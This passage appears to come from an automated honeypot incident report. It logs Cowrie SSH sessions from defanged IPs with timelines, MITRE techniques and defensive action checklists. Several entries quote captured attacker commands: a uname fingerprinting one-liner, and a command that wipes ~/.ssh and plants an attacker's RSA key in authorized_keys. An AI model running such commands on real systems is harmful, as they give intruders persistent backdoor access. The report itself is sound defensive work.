| `2026-07-04 05:13:33` | `cowrie.login.success` |
| `2026-07-04 05:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.8[.]79` to AbuseIPDB if not already reported
- [ ] Block `163.7.8[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9780a8a7f3e7

| Field | Detail |
|---|---|
| **Source IP** | `163.7.8[.]79` |
| **First Seen** | 2026-07-04 05:13 |
| **Last Seen** | 2026-07-04 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:13:34` | `cowrie.session.connect` |
| `2026-07-04 05:13:34` | `cowrie.client.version` |
| `2026-07-04 05:13:34` | `cowrie.client.kex` |
| `2026-07-04 05:13:35` | `cowrie.login.success` |
| `2026-07-04 05:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.8[.]79` to AbuseIPDB if not already reported
- [ ] Block `163.7.8[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44aa9891ae6a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:15 |
| **Last Seen** | 2026-07-04 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:15:27` | `cowrie.session.connect` |
| `2026-07-04 05:15:27` | `cowrie.client.version` |
| `2026-07-04 05:15:27` | `cowrie.client.kex` |
| `2026-07-04 05:15:28` | `cowrie.login.success` |
| `2026-07-04 05:15:28` | `cowrie.session.params` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.success` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.command.input` |
| `2026-07-04 05:15:28` | `cowrie.log.closed` |
| `2026-07-04 05:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22bc2c2480c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:16 |
| **Last Seen** | 2026-07-04 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:16:03` | `cowrie.session.connect` |
| `2026-07-04 05:16:03` | `cowrie.client.version` |
| `2026-07-04 05:16:03` | `cowrie.client.kex` |
| `2026-07-04 05:16:03` | `cowrie.login.success` |
| `2026-07-04 05:16:04` | `cowrie.session.params` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.success` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.command.input` |
| `2026-07-04 05:16:04` | `cowrie.log.closed` |
| `2026-07-04 05:16:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776ac8953904

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:20 |
| **Last Seen** | 2026-07-04 05:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:20:11` | `cowrie.session.connect` |
| `2026-07-04 05:20:11` | `cowrie.client.version` |
| `2026-07-04 05:20:11` | `cowrie.client.kex` |
| `2026-07-04 05:20:11` | `cowrie.login.success` |
| `2026-07-04 05:20:12` | `cowrie.session.params` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.success` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:12` | `cowrie.command.input` |
| `2026-07-04 05:20:13` | `cowrie.log.closed` |
| `2026-07-04 05:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c34732d79e4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 05:21 |
| **Last Seen** | 2026-07-04 05:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:21:29` | `cowrie.session.connect` |
| `2026-07-04 05:21:30` | `cowrie.client.version` |
| `2026-07-04 05:21:30` | `cowrie.client.kex` |
| `2026-07-04 05:21:37` | `cowrie.login.success` |
| `2026-07-04 05:21:40` | `cowrie.session.params` |
| `2026-07-04 05:21:40` | `cowrie.command.input` |
| `2026-07-04 05:21:41` | `cowrie.log.closed` |
| `2026-07-04 05:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6ace87bc07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:21 |
| **Last Seen** | 2026-07-04 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:21:52` | `cowrie.session.connect` |
| `2026-07-04 05:21:52` | `cowrie.client.version` |
| `2026-07-04 05:21:52` | `cowrie.client.kex` |
| `2026-07-04 05:21:52` | `cowrie.login.success` |
| `2026-07-04 05:21:53` | `cowrie.session.params` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.success` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.command.input` |
| `2026-07-04 05:21:53` | `cowrie.log.closed` |
| `2026-07-04 05:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a40bb636aac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:24 |
| **Last Seen** | 2026-07-04 05:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:24:17` | `cowrie.session.connect` |
| `2026-07-04 05:24:17` | `cowrie.client.version` |
| `2026-07-04 05:24:17` | `cowrie.client.kex` |
| `2026-07-04 05:24:17` | `cowrie.login.success` |
| `2026-07-04 05:24:18` | `cowrie.session.params` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.success` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.command.input` |
| `2026-07-04 05:24:18` | `cowrie.log.closed` |
| `2026-07-04 05:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64a7b01cdcc

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-07-04 05:27 |
| **Last Seen** | 2026-07-04 05:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:27:44` | `cowrie.session.connect` |
| `2026-07-04 05:27:44` | `cowrie.client.version` |
| `2026-07-04 05:27:44` | `cowrie.client.kex` |
| `2026-07-04 05:27:46` | `cowrie.login.success` |
| `2026-07-04 05:27:48` | `cowrie.session.params` |
| `2026-07-04 05:27:48` | `cowrie.command.input` |
| `2026-07-04 05:27:48` | `cowrie.command.failed` |
| `2026-07-04 05:27:49` | `cowrie.log.closed` |
| `2026-07-04 05:27:50` | `cowrie.session.params` |
| `2026-07-04 05:27:50` | `cowrie.command.input` |
| `2026-07-04 05:27:50` | `cowrie.session.file_download` |
| `2026-07-04 05:27:50` | `cowrie.log.closed` |
| `2026-07-04 05:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770e776abb07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 05:27 |
| **Last Seen** | 2026-07-04 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:27:46` | `cowrie.session.connect` |
| `2026-07-04 05:27:46` | `cowrie.client.version` |
| `2026-07-04 05:27:46` | `cowrie.client.kex` |
| `2026-07-04 05:27:46` | `cowrie.login.success` |
| `2026-07-04 05:27:47` | `cowrie.session.params` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.success` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:47` | `cowrie.command.input` |
| `2026-07-04 05:27:48` | `cowrie.log.closed` |
| `2026-07-04 05:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cb8389cb0d0

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-07-04 05:27 |
| **Last Seen** | 2026-07-04 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:27:51` | `cowrie.session.connect` |
| `2026-07-04 05:27:51` | `cowrie.client.version` |
| `2026-07-04 05:27:52` | `cowrie.client.kex` |
| `2026-07-04 05:27:53` | `cowrie.login.success` |
| `2026-07-04 05:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c103510b7a06

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-07-04 05:27 |
| **Last Seen** | 2026-07-04 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:27:54` | `cowrie.session.connect` |
| `2026-07-04 05:27:54` | `cowrie.client.version` |
| `2026-07-04 05:27:54` | `cowrie.client.kex` |
| `2026-07-04 05:27:57` | `cowrie.login.success` |
| `2026-07-04 05:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c2b212e92b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 05:28 |
| **Last Seen** | 2026-07-04 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:28:11` | `cowrie.session.connect` |
| `2026-07-04 05:28:11` | `cowrie.client.version` |
| `2026-07-04 05:28:11` | `cowrie.client.kex` |
| `2026-07-04 05:28:12` | `cowrie.login.success` |
| `2026-07-04 05:28:13` | `cowrie.session.params` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.success` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.command.input` |
| `2026-07-04 05:28:13` | `cowrie.log.closed` |
| `2026-07-04 05:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95f43a4ed19e

| Field | Detail |
|---|---|
| **Source IP** | `121.184.144[.]232` |
| **First Seen** | 2026-07-04 05:29 |
| **Last Seen** | 2026-07-04 05:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:29:09` | `cowrie.session.connect` |
| `2026-07-04 05:29:09` | `cowrie.client.version` |
| `2026-07-04 05:29:10` | `cowrie.client.kex` |
| `2026-07-04 05:29:10` | `cowrie.login.success` |
| `2026-07-04 05:29:11` | `cowrie.session.params` |
| `2026-07-04 05:29:11` | `cowrie.command.input` |
| `2026-07-04 05:29:11` | `cowrie.command.failed` |
| `2026-07-04 05:29:12` | `cowrie.log.closed` |
| `2026-07-04 05:29:12` | `cowrie.session.params` |
| `2026-07-04 05:29:12` | `cowrie.command.input` |
| `2026-07-04 05:29:13` | `cowrie.session.file_download` |
| `2026-07-04 05:29:13` | `cowrie.log.closed` |
| `2026-07-04 05:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.184.144[.]232` to AbuseIPDB if not already reported
- [ ] Block `121.184.144[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab7e3d86d10

| Field | Detail |
|---|---|
| **Source IP** | `121.184.144[.]232` |
| **First Seen** | 2026-07-04 05:29 |
| **Last Seen** | 2026-07-04 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:29:13` | `cowrie.session.connect` |
| `2026-07-04 05:29:13` | `cowrie.client.version` |
| `2026-07-04 05:29:13` | `cowrie.client.kex` |
| `2026-07-04 05:29:14` | `cowrie.login.success` |
| `2026-07-04 05:29:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.184.144[.]232` to AbuseIPDB if not already reported
- [ ] Block `121.184.144[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35034eacdde5

| Field | Detail |
|---|---|
| **Source IP** | `121.184.144[.]232` |
| **First Seen** | 2026-07-04 05:29 |
| **Last Seen** | 2026-07-04 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 05:29:14` | `cowrie.session.connect` |
| `2026-07-04 05:29:14` | `cowrie.client.version` |
| `2026-07-04 05:29:14` | `cowrie.client.kex` |
| `2026-07-04 05:29:15` | `cowrie.login.success` |
| `2026-07-04 05:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.184.144[.]232` to AbuseIPDB if not already reported
- [ ] Block `121.184.144[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d706c95d5ead

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-07-04 05:29 |
| **Last Seen** | 2026-07-04 05:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

